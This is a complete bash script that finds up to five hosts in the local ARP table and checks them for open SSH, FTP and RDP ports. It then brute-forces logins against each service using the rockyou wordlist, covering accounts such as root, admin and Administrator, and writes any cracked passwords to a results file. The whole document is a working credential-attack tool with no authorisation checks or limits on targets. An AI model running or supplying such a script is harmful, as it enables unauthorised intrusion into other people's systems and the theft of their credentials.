#!/bin/bash

ROCKYOU_FILE="/usr/share/wordlists/rockyou.txt"
TIMEOUT=3
OUTPUT_FILE="password_scan_results.txt"

if [ ! -f "$ROCKYOU_FILE" ]; then
    echo "File $ROCKYOU_FILE not found!"
    exit 1
fi

try_ssh_passwords() {
    local ip=$1
    local users=("root" "admin" "user")
    
    for user in "${users[@]}"; do
        echo "  Scanning SSH passwords on $ip (user: $user)"
        
        cat "$ROCKYOU_FILE" | while read password; do
            result=$(sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$TIMEOUT -o BatchMode=yes $user@$ip "whoami 2>/dev/null" 2>/dev/null)
            
            if [ "$result" == "$user" ]; then
                echo "    🎉 PASSWORD FOUND: $password" | tee -a $OUTPUT_FILE
                echo "      Service: SSH, IP: $ip, User: $user" >> $OUTPUT_FILE
                return 0
            fi
        done
    done
}

check_ftp() {
    local ip=$1
    echo "  Checking FTP on $ip"
    
    if curl -u anonymous:anonymous ftp://$ip/ --connect-timeout $TIMEOUT 2>/dev/null | grep -q "failed\|error"; then
        echo "    ❌ FTP anonymous access failed"
    else
        echo "    🎉 FTP anonymous access open" | tee -a $OUTPUT_FILE
        echo "      Service: FTP, IP: $ip" >> $OUTPUT_FILE
    fi
    
    local users=("root" "admin" "ftp" "anonymous" "administrator")
    for user in "${users[@]}"; do
        echo "    Trying user: $user"
        cat "$ROCKYOU_FILE" | while read password; do
            if curl -u $user:$password "ftp://$ip/" --list-only --connect-timeout $TIMEOUT 2>/dev/null | head -1 | grep -q -v "curl:\|failed"; then
                echo "    🎉 FTP PASSWORD FOUND: $password" | tee -a $OUTPUT_FILE
                echo "      Service: FTP, IP: $ip, User: $user" >> $OUTPUT_FILE
                return 0
            fi
        done
    done
}

try_rdp_passwords() {
    local ip=$1
    local users=("Administrator" "admin" "user")
    
    for user in "${users[@]}"; do
        echo "  Scanning RDP passwords on $ip (user: $user)"
        
        cat "$ROCKYOU_FILE" | while read password; do
            timeout 5 xfreerdp /v:$ip /u:$user /p:$password /cert-ignore +auth-only /sec:nla /timeout:3000 &>/dev/null
            if [ $? -eq 0 ]; then
                echo "    🎉 RDP PASSWORD FOUND: $password" | tee -a $OUTPUT_FILE
                echo "      Service: RDP, IP: $ip, User: $user" >> $OUTPUT_FILE
                return 0
            fi
        done
    done
}

check_host() {
    local ip=$1
    echo "Scanning host: $ip"
    
    if nc -z -w $TIMEOUT $ip 22 2>/dev/null; then
        echo "  ✅ SSH available on $ip"
        try_ssh_passwords $ip
    else
        echo "  ❌ SSH not available on $ip"
    fi
    
    if nc -z -w $TIMEOUT $ip 21 2>/dev/null; then
        echo "  ✅ FTP available on $ip"
        check_ftp $ip
    else
        echo "  ❌ FTP not available on $ip"
    fi
    
    if nc -z -w $TIMEOUT $ip 3389 2>/dev/null; then
        echo "  ✅ RDP available on $ip"
        try_rdp_passwords $ip
    else
        echo "  ❌ RDP not available on $ip"
    fi
    
    echo ""
}

echo "Starting network scan..."
> $OUTPUT_FILE

IPS=$(arp -a 2>/dev/null | grep -oP '(\d+\.\d+\.\d+\.\d+)' | sort -u | head -5)

for ip in $IPS; do
    check_host $ip
done

echo "Scan completed. Check file: $OUTPUT_FILE"
